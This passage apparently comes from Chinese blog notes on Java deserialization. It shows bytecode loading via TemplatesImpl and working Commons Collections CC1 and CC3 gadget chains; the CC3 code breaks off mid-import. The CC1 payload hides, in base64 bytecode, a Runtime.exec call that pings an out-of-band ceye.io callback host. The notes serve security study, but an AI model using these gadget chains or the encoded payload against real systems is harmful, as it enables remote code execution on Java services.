<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> bytecode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj , String name , Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Class  clazz = obj.getClass();</span><br><span class="line">        Field field = clazz.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj , value);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span> data[] = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">byte</span> code[]  =Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADoAHgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCQAIAAkHAAoMAAsADAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsIAA4BABN0aGlzIGlzICBjb25zdHJ1Y3QgCgAQABEHABIMABMAFAEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCAAWAQAPdGhpcyBpcyBzdGF0aWMgBwAYAQAOYnl0ZWNvZGUvSGVsbG8BAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQAhABcAAgAAAAAAAgABAAUABgABABkAAAAtAAIAAQAAAA0qtwABsgAHEg22AA+xAAAAAQAaAAAADgADAAAABwAEAAgADAAJAAgAGwAGAAEAGQAAACUAAgAAAAAACbIABxIVtgAPsQAAAAEAGgAAAAoAAgAAAAQACAAFAAEAHAAAAAIAHQ==&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Method defineclass = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,  String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">            defineclass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">			defineclass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;bytecode.Hello&quot;</span> ,code, <span class="number">0</span>,  code.length);</span><br><span class="line">            System.out.println(<span class="number">21</span>);</span><br><span class="line">            hello.newInstance();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用反射直接使用<code>ClassLoader</code>的<code>defineClass</code>方法，传入字节码我们直接得到对应的类</p>
<h2 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a><code>TemplatesImpl</code>加载字节码</h2><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个类中定义了一个内部类<code>TransletClassLoader</code> 使用了<code>defineClass</code>方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Class&lt;?&gt;&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">     TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">         <span class="keyword">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader(ClassLoader parent, Map&lt;String, Class&lt;?&gt;&gt; mapEF) &#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">        <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">        <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ret = <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class&lt;?&gt; defineClass(<span class="keyword">final</span> <span class="keyword">byte</span>[] b) &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; defineClass(<span class="keyword">final</span> <span class="keyword">byte</span>[] b, ProtectionDomain pd) &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length, pd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以找到它的调用链条</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
<p>其中最前面的两个方法申明为<code>public</code>可以被外部调用。我们可以尝试使用<code>TemplatesImpl</code>来加载字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span> code[]  =Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADoALAoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWCQAIAAkHAAoMAAsADAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsIAA4BABNIZWxsbyBUZW1wbGF0ZXNJbXBsCgAQABEHABIMABMAFAEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWBwAWAQAbYnl0ZWNvZGUvSGVsbG9UZW1wbGF0ZXNJbXBsAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB1MYnl0ZWNvZGUvSGVsbG9UZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAkAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEAIQAVAAIAAAAAAAMAAQAXABgAAgAZAAAAPwAAAAMAAAABsQAAAAIAGgAAAAYAAQAAAAkAGwAAACAAAwAAAAEAHAAdAAAAAAABAB4AHwABAAAAAQAgACEAAgAiAAAABAABACMAAQAXACUAAgAZAAAASQAAAAQAAAABsQAAAAIAGgAAAAYAAQAAAAsAGwAAACoABAAAAAEAHAAdAAAAAAABAB4AHwABAAAAAQAmACcAAgAAAAEAKAApAAMAIgAAAAQAAQAjAAEABQAGAAEAGQAAAD8AAgABAAAADSq3AAGyAAcSDbYAD7EAAAACABoAAAAOAAMAAAANAAQADgAMAA8AGwAAAAwAAQAAAA0AHAAdAAAAAQAqAAAAAgAr&quot;</span>);</span><br><span class="line"></span><br><span class="line">    TemplatesImpl obj  = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">    setFieldValue(obj , <span class="string">&quot;_bytecodes&quot;</span> , <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">    setFieldValue(obj , <span class="string">&quot;_name&quot;</span> , <span class="string">&quot;sfsf&quot;</span>);</span><br><span class="line">    setFieldValue(obj , <span class="string">&quot;_tfactory&quot;</span> , <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">    System.out.println(<span class="number">1234</span>);</span><br><span class="line">    obj.newTransformer();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要设置 <code>_bytecodes</code> 为对应的字节码数组, <code>_name</code>可以为任意值，不为空即可。 <code>_tfactory</code> 值为 一个 TransformerFactoryImpl类。</p>
<p>但是我们还需要字节码为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>的子类<br>我们构造类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> bytecode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloTemplatesImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesImpl&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>字节码</tag>
      </tags>
  </entry>
  <entry>
    <title>java漫谈笔记-反序列化篇-CC3</title>
    <url>/2022/03/16/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-CC3/</url>
    <content><![CDATA[<h1 id="java漫谈笔记-反序列化篇-CC3"><a href="#java漫谈笔记-反序列化篇-CC3" class="headerlink" title="java漫谈笔记-反序列化篇-CC3"></a>java漫谈笔记-反序列化篇-CC3</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。</p>
<h2 id="改造CC1"><a href="#改造CC1" class="headerlink" title="改造CC1"></a>改造CC1</h2><p>对于CC1，可以使用字节码作出对应的改造。来达到相同的效果。</p>
<span id="more"></span>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> common.Common;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span>  <span class="title">CC1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEAJHBpbmcgamF2YTE0LnVuc2VyaWF6by5oMnQ1a3kuY2V5ZS5pbwoACAAQDAARABIBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7BwAUAQAbYnl0ZWNvZGUvSGVsbG9UZW1wbGF0ZXNJbXBsAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB1MYnl0ZWNvZGUvSGVsbG9UZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAiAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACkBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAKU291cmNlRmlsZQEAF0hlbGxvVGVtcGxhdGVzSW1wbC5qYXZhACEAEwACAAAAAAADAAEAFQAWAAIAFwAAAD8AAAADAAAAAbEAAAACABgAAAAGAAEAAAAJABkAAAAgAAMAAAABABoAGwAAAAAAAQAcAB0AAQAAAAEAHgAfAAIAIAAAAAQAAQAhAAEAFQAjAAIAFwAAAEkAAAAEAAAAAbEAAAACABgAAAAGAAEAAAALABkAAAAqAAQAAAABABoAGwAAAAAAAQAcAB0AAQAAAAEAJAAlAAIAAAABACYAJwADACAAAAAEAAEAIQABAAUABgACABcAAABAAAIAAQAAAA4qtwABuAAHEg22AA9XsQAAAAIAGAAAAA4AAwAAAA0ABAAOAA0ADwAZAAAADAABAAAADgAaABsAAAAgAAAABAABACgAAQAqAAAAAgAr&quot;</span>);</span><br><span class="line">        TemplatesImpl obj =  <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        Common.setFieldValue(obj , <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;tset&quot;</span>);</span><br><span class="line">        Common.setFieldValue(obj , <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        Common.setFieldValue(obj , <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Transformer[] faketransformer = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(obj),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span> , <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span></span><br><span class="line">                ChainedTransformer(faketransformer);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;valueasdfsafs&quot;</span> ,<span class="string">&quot;xxxxjl&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;valjasdf&quot;</span>);</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxymap);</span><br><span class="line"></span><br><span class="line">        Field field = transformerChain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>在CC1之后，开始有对于反序列化函数的黑名单出现。其中<code>InvokeTransform</code>就是其中禁止的一个函数。于是<code>CC3</code>这条新的链出现用于绕过<code>InvokeTransform</code>来执行命令。<br>这里出现了一个新类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code><br>这个类的构造方法中有<code>templates.newTransformer()</code>可以供我们调用.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">    TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">    _overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是我们仍然需要一个方法来调用<code>TrAXFilter</code>的构造方法.我们用到一个新的<code>transformer</code><br><code>org.apache.commons.collections.functors.InstantiateTransformer</code>。它的<code>transform</code>方法就是调用构造方法.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以使用这两个方法来直接执行<code>templatesImpl.newTranformer</code>从而绕过<code>InvokeTransformer</code>方法.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> common.Common;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span 